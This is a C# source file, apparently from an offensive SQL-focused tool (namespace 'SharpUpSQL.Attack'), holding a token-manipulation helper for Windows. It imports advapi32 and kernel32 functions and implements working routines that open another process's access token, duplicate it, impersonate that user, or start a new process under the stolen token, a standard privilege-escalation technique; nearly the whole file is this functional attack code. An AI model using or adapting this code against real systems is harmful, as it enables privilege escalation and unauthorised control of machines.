using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace SharpUpSQL.Attack
{
    internal static class TokenManipulationHelper
    {
        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private const uint MAXIMUM_ALLOWED = 0x02000000;
        private const int SecurityImpersonation = 2;
        private const int TokenPrimary = 1;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(
            IntPtr existingToken,
            uint desiredAccess,
            IntPtr tokenAttributes,
            int impersonationLevel,
            int tokenType,
            out IntPtr duplicateToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ImpersonateLoggedOnUser(IntPtr token);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool RevertToSelf();

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessWithTokenW(
            IntPtr token,
            uint logonFlags,
            string applicationName,
            string commandLine,
            uint creationFlags,
            IntPtr environment,
            string currentDirectory,
            ref STARTUPINFO startupInfo,
            out PROCESS_INFORMATION processInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint desiredAccess, bool inheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr handle);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        internal static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        internal static bool ImpersonateProcess(int processId)
        {
            IntPtr processHandle = IntPtr.Zero;
            IntPtr tokenHandle = IntPtr.Zero;
            IntPtr duplicate = IntPtr.Zero;

            try
            {
                processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, processId);
                if (processHandle == IntPtr.Zero)
                {
                    return false;
                }

                if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, out tokenHandle))
                {
                    return false;
                }

                if (!DuplicateTokenEx(
                        tokenHandle,
                        MAXIMUM_ALLOWED,
                        IntPtr.Zero,
                        SecurityImpersonation,
                        TokenPrimary,
                        out duplicate))
                {
                    return false;
                }

                return ImpersonateLoggedOnUser(duplicate);
            }
            finally
            {
                if (duplicate != IntPtr.Zero)
                {
                    CloseHandle(duplicate);
                }

                if (tokenHandle != IntPtr.Zero)
                {
                    CloseHandle(tokenHandle);
                }

                if (processHandle != IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                }
            }
        }

        internal static bool Revert()
        {
            return RevertToSelf();
        }

        internal static bool CreateProcessWithToken(int processId, string application, string arguments)
        {
            IntPtr processHandle = IntPtr.Zero;
            IntPtr tokenHandle = IntPtr.Zero;
            IntPtr duplicate = IntPtr.Zero;

            try
            {
                processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, processId);
                if (processHandle == IntPtr.Zero)
                {
                    return false;
                }

                if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, out tokenHandle))
                {
                    return false;
                }

                if (!DuplicateTokenEx(
                        tokenHandle,
                        MAXIMUM_ALLOWED,
                        IntPtr.Zero,
                        SecurityImpersonation,
                        TokenPrimary,
                        out duplicate))
                {
                    return false;
                }

                var startup = new STARTUPINFO { cb = Marshal.SizeOf(typeof(STARTUPINFO)) };
                PROCESS_INFORMATION processInfo;
                var commandLine = string.IsNullOrWhiteSpace(arguments) ? null : arguments;
                return CreateProcessWithTokenW(
                    duplicate,
                    0,
                    application,
                    commandLine,
                    0,
                    IntPtr.Zero,
                    null,
                    ref startup,
                    out processInfo);
            }
            finally
            {
                if (duplicate != IntPtr.Zero)
                {
                    CloseHandle(duplicate);
                }

                if (tokenHandle != IntPtr.Zero)
                {
                    CloseHandle(tokenHandle);
                }

                if (processHandle != IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                }
            }
        }
    }
}
